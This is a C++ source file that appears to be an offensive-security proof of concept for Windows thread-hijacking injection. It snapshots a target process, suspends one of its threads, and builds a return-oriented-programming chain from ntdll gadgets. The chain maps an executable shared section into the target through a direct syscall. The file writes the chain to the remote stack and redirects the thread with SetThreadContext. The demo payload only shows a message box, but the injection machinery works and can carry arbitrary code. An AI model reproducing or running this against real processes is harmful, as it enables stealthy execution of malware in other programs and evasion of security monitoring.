#include "includes.h"

DWORD srop_class<FULL_INFO>::findThreadForHijacking() {
	THREADENTRY32 thread32 = { sizeof(THREADENTRY32) };
	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, this->data->remote_thread_info.processId);

	if (hThreadSnapshot == INVALID_HANDLE_VALUE) {
		cout << "[+] Unable to get Snapshot handle" << endl;
		CloseHandle(hThreadSnapshot);
		return 0;
	}

	if (!Thread32First(hThreadSnapshot, &thread32)) {
		cout << "[+] Unable to get first thread from process snapshot" << endl;
		return 0;
	}

	HANDLE hThreadHandle = NULL;
	do
	{
		if (thread32.th32OwnerProcessID != this->data->remote_thread_info.processId || thread32.th32ThreadID == 0) continue;

		hThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, thread32.th32ThreadID);

		if (hThreadHandle == INVALID_HANDLE_VALUE) continue;

		else {
			this->data->remote_thread_info.threadId = thread32.th32ThreadID;
			this->data->remote_thread_info.hThread = hThreadHandle;
			CloseHandle(hThreadSnapshot);
			return 1;
		}

	} while (Thread32Next(hThreadSnapshot, &thread32));

	CloseHandle(hThreadSnapshot);
	return 0;
}

PVOID srop_class<FULL_INFO>::CreateSharedSection() {

	HANDLE hLocalSection = CreateFileMappingA(
		(HANDLE)-1,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		this->data->payload_info.payloadSize,
		NULL);

	if (hLocalSection == INVALID_HANDLE_VALUE) {

		cout << "[+] CreateFileMappingA error: " << GetLastError() << endl;
		CloseHandle(hLocalSection);
		return NULL;
	}

	PVOID address = MapViewOfFile(
		hLocalSection,
		FILE_MAP_READ | FILE_MAP_WRITE,
		NULL,
		NULL,
		NULL);

	if (address == NULL) {

		cout << "[+] MapViewOfFile error: " << GetLastError() << endl;
		return NULL;
	}

	DWORD success = DuplicateHandle(
		GetCurrentProcess(),
		hLocalSection, this->data->remote_thread_info.hProcess,
		&this->data->section_info.hRemoteSection,
		0,
		0,
		DUPLICATE_SAME_ACCESS);

	if (!success) {
		cout << "[+] Unable to duplicate handles, error: " << GetLastError() << endl;
		return NULL;
	}

	cout << "[+] Remote section handle value: " << (PVOID)this->data->section_info.hRemoteSection << endl;

	CloseHandle(hLocalSection);
	return address;

}

DWORD srop_class<FULL_INFO>::CreateSharedSectionWithPayload() {

	BYTE payload[] = {
		/*0: */			0x48, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,	// movabs  rax, 0x1111111111111111
		/*a: */			0x50,														// push rax
		/*b: */			0x49, 0x89, 0xe0, 											// mov r8, rsp
		/*e: */			0x48, 0xB8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,	// movabs  rax, 0x2222222222222222
		/*19: */		0x50,														// push rax
		/*1a: */		0x48, 0x89, 0xe2, 											// mov rdx, rsp
		/*1d: */		0x48, 0x31, 0xC9,											// xor rcx, rcx
		/*20: */		0x4D, 0x31, 0xC9,											// xor r9, r9
		/*23: */		0x48, 0x83, 0xEC, 0x28,										// sub rsp, 0x28
		/*27: */		0x48, 0xB8, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,	// movabs  rax, 0x3333333333333333
		/*31: */		0xFF, 0xD0,													// call rax
		/*33: */		0x48, 0x83, 0xC4, 0x38,										// add rsp, 0x38
		/*37: */		0x48, 0x31, 0xc0,											// xor rax, rax
		/*3a: */		0xC3,														// ret
	};


	this->data->payload_info.payload = payload;
	this->data->payload_info.payloadSize = sizeof(payload);

	HMODULE hUser32 = LoadLibrary(L"user32");
	PVOID hMessageBoxA = (PVOID)GetProcAddress(hUser32, "MessageBoxA");

	char text[sizeof(DWORD64)] = "H3lLo!";
	char caption[sizeof(DWORD64)] = "W0rLd!";

	cout << "[+] Creating shared Section" << endl;
	LPVOID address = this->CreateSharedSection();

	if (address == NULL) {
		cout << "[+] Creating shared Section failed" << endl;
		return 0;
	}

	cout << "[+] Copying payload to shared section" << endl;
	memcpy(address, payload, sizeof(payload));
	memcpy((helper_functions::memmem(address, sizeof(payload), "\x11\x11\x11\x11\x11\x11\x11\x11", 8)), text, 8);
	memcpy((helper_functions::memmem(address, sizeof(payload), "\x22\x22\x22\x22\x22\x22\x22\x22", 8)), caption, 8);
	memcpy((helper_functions::memmem(address, sizeof(payload), "\x33\x33\x33\x33\x33\x33\x33\x33", 8)), &hMessageBoxA, 8);

	cout << "[+] Unmapping local file mapping" << endl;
	UnmapViewOfFile(address);
	return 1;

}

DWORD srop_class<FULL_INFO>::CreateROP() {

	DWORD64* ROP = (DWORD64*)malloc(2000);
	ZeroMemory(ROP, 2000);

	DWORD count = 0;
	HMODULE hModuleNtdll = GetModuleHandle(L"ntdll");
	DWORD64 popregs = helper_functions::SearchRopGadgets("\x58\x5A\x59\x41\x58\x41\x59\x41\x5A\x41\x5B\xC3", 12); /*	0:  58						pop    rax
																														1:  5a				        pop    rdx
																														2:  59				        pop    rcx
																														3:  41 58			        pop    r8
																														5:  41 59			        pop    r9
																														7:  41 5a			        pop    r10
																														9:  41 5b			        pop    r11
																														10: c3						ret					*/	



	DWORD64 syscall = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "NtYieldExecution") + 0x12;				
	DWORD64 RtlCaptureContext = (DWORD64)GetProcAddress((HMODULE)hModuleNtdll, "RtlCaptureContext");


	DWORD64 pivotGadget = helper_functions::SearchRopGadgets("\x5C\xC3", 2); 									/*		0:  5c						pop rsp
																														1:  c3						ret					*/


	DWORD64 add28 = helper_functions::SearchRopGadgets("\x48\x83\xC4\x28\xC3", 5);								/*		0:  48 83 c4 28				add    rsp,0x28
																														4:  c3                      ret					*/


	DWORD64 add58 = helper_functions::SearchRopGadgets("\x48\x83\xC4\x58\xC3", 5);								/*		0:	48 83 c4 58				add rsp, 0x58
																														4:	c3						ret					*/

	
	DWORD64 poprax = add58 + 3; 																				/*		0:  58						pop    rax
																														1:  c3						ret    
																																										*/	
	

	DWORD64 poprcx = helper_functions::SearchRopGadgets("\x59\xC3", 2);											/*		0:  59						pop    rcx
																														1:  c3						ret    
																																										*/	


	DWORD64 ret = helper_functions::SearchRopGadgets("\xC3", 1); 												/*		0:	c3						ret					
																																										*/
		

	DWORD64 movraxrcx = helper_functions::SearchRopGadgets("\x48\x89\x01\xC3", 4);								/*		0: 48 89 01					mov [rcx], rax
																														3: c3						ret
			
																																							*/


	this->data->context_info.newRSP = this->data->context_info.oldRSP - 0x2000;
	this->data->context_info.newRIP = poprcx;


	DWORD64 ContextAddress = count++;


	if (!(((DWORD64)this->data->context_info.newRSP + ((count+2) * sizeof(DWORD64))) & 0xF))
	{
		ROP[count++] = ret;

	}

	ROP[count++] = RtlCaptureContext;
	ROP[count++] = add28;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;


	ROP[count++] = poprax;
	ROP[count++] = this->data->context_info.oldRCX;
	ROP[count++] = poprcx;
	DWORD64 contextRcxAddress = count++;
	ROP[count++] = movraxrcx;

	ROP[count++] = poprax;
	ROP[count++] = this->data->context_info.oldRSP;
	ROP[count++] = poprcx;
	DWORD64 contextRspAddress = count++;
	ROP[count++] = movraxrcx;

	ROP[count++] = poprax;
	ROP[count++] = this->data->context_info.oldRIP;
	ROP[count++] = poprcx;
	DWORD64 contextRipAddress = count++;
	ROP[count++] = movraxrcx;

	if (!(((DWORD64)this->data->context_info.newRSP + (count+10) * sizeof(DWORD64)) & 0xF))
	{
		ROP[count++] = ret;
	
	}

	ROP[count++] = popregs;
	ROP[count++] = 0x28;
	ROP[count++] = -1;
	ROP[count++] = (DWORD64)this->data->section_info.hRemoteSection;
	DWORD64 payloadAddress = count++;
	ROP[count++] = NULL;
	ROP[count++] = (DWORD64)this->data->section_info.hRemoteSection;
	ROP[count++] = NULL;
	ROP[count++] = syscall;
	ROP[count++] = add58;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = 0;
	ROP[count++] = NULL;
	DWORD64 ViewSize = count++;
	ROP[count++] = 2;
	ROP[count++] = NULL;
	ROP[count++] = PAGE_EXECUTE_READ;
	ROP[count++] = NULL;

	ROP[payloadAddress] = (DWORD64)this->data->context_info.newRSP + sizeof(DWORD64) * count++;


	if (!(((DWORD64)this->data->context_info.newRSP + (count + 10) * sizeof(DWORD64)) & 0xF))
	{
		ROP[count++] = ret;
	}

	ROP[count++] = popregs;
	ROP[count++] = 0x43;
	ROP[count++] = 0;
	DWORD64 ContextAddressForRCX = count++;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	DWORD64 ContextAddressForR10 = count++;
	ROP[count++] = NULL;
	ROP[count++] = syscall;
	ROP[count++] = add28;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[count++] = NULL;


	ROP[ViewSize] = (DWORD64)this->data->context_info.newRSP + sizeof(DWORD64) * count;
	ROP[count++] = this->data->payload_info.payloadSize;


	ROP[contextRcxAddress] = (DWORD64)this->data->context_info.newRSP + sizeof(DWORD64) * count;
	ROP[count++] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rcx);

	ROP[contextRspAddress] = (DWORD64)this->data->context_info.newRSP + sizeof(DWORD64) * count;
	ROP[count++] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rsp);

	ROP[contextRipAddress] = (DWORD64)this->data->context_info.newRSP + sizeof(DWORD64) * count;
	ROP[count++] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rip);


	ROP[count++] = NULL;
	ROP[count++] = NULL;
	ROP[ContextAddress] = ((DWORD64)this->data->context_info.newRSP + sizeof(DWORD64) * count) & 0xFFFFFFFFFFFFFFF0;
	ROP[ContextAddressForRCX] = ROP[ContextAddress];
	ROP[ContextAddressForR10] = ROP[ContextAddress];
	ROP[contextRcxAddress] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rcx);
	ROP[contextRspAddress] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rsp);
	ROP[contextRipAddress] = ROP[ContextAddress] + (DWORD64)(&((CONTEXT*)0)->Rip);
	count += ((sizeof(CONTEXT)) / sizeof(DWORD64));



	this->data->rop_info.ROP = ROP;
	this->data->rop_info.ROPSize = count * sizeof(DWORD64);



	return 1;

}

DWORD srop_class<FULL_INFO>::Start() {

	cout << "[+] Looking in process " << this->data->remote_thread_info.processId << " for a thread to hijack" << endl;

	if (!this->findThreadForHijacking()) {
		cout << "[+] Unable to find a thread to hijack\n" << EXIT_PROGRAM_COMMENT << endl;
		return 0;
	}

	cout << "[+] Thread: " << this->data->remote_thread_info.threadId << " was found suitable for hijacking" << endl;

	cout << "[+] Suspending thread" << endl;
	SuspendThread(this->data->remote_thread_info.hThread);
	
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_ALL;
	cout << "[+] Getting thread context" << endl;
	BOOL success = GetThreadContext(this->data->remote_thread_info.hThread, &ctx);

	if (!success) {
		cout << "[+] Unable to get thread context\n" << EXIT_PROGRAM_COMMENT << endl;
		return 0;
	}

	cout << "[+] Old RSP: " << (PVOID)ctx.Rsp << " || Old RIP: " << (PVOID)ctx.Rip << " || Old RCX: " << (PVOID)ctx.Rcx << endl;

	this->data->context_info.oldRSP = ctx.Rsp;
	this->data->context_info.oldRIP = ctx.Rip;
	this->data->context_info.oldRCX = ctx.Rcx;

	cout << "[+] Creating payload" << endl;
	if (!this->CreateSharedSectionWithPayload()) {
		cout << EXIT_PROGRAM_COMMENT << endl;
		return 0;
	}

	cout << "[+] Creating ROP" << endl;
	if (!this->CreateROP()) {
		cout << EXIT_PROGRAM_COMMENT << endl;
		return 0;
	}

	ctx.Rsp = this->data->context_info.newRSP;
	ctx.Rip = this->data->context_info.newRIP;

	cout << "[+] New RSP: " << (PVOID)ctx.Rsp << " || New RIP: " << (PVOID)ctx.Rip << endl;
	
	cout << "[+] Writting ROP to new stack" << endl;
	DWORD64 bytesWritten = 0;
	WriteProcessMemory(
		this->data->remote_thread_info.hProcess,
		(PVOID)this->data->context_info.newRSP,
		this->data->rop_info.ROP,
		this->data->rop_info.ROPSize,
		&bytesWritten);
	
	cout << "[+] Setting new thread context" << endl;
	SetThreadContext(this->data->remote_thread_info.hThread, &ctx);


	cout << "[+] Resuming thread" << endl;
	ResumeThread(this->data->remote_thread_info.hThread);
	return 1;
}